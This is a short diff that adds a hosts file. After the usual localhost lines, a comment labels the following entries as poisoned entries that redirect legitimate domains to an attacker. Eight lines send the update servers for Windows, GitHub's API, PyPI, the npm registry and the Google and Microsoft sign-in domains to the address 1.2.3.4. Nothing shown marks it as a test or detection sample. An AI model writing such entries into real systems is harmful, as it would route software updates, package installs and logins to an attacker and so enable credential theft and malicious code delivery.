@@ -1,0 +1,12 @@
+127.0.0.1 localhost
+::1 localhost ip6-localhost ip6-loopback
+
+# Poisoned entries - redirect legitimate domains to attacker
+1.2.3.4   update.microsoft.com
+1.2.3.4   updates.microsoft.com
+1.2.3.4   windowsupdate.com
+1.2.3.4   api.github.com
+1.2.3.4   pypi.org
+1.2.3.4   registry.npmjs.org
+1.2.3.4   accounts.google.com
+1.2.3.4   login.microsoftonline.com
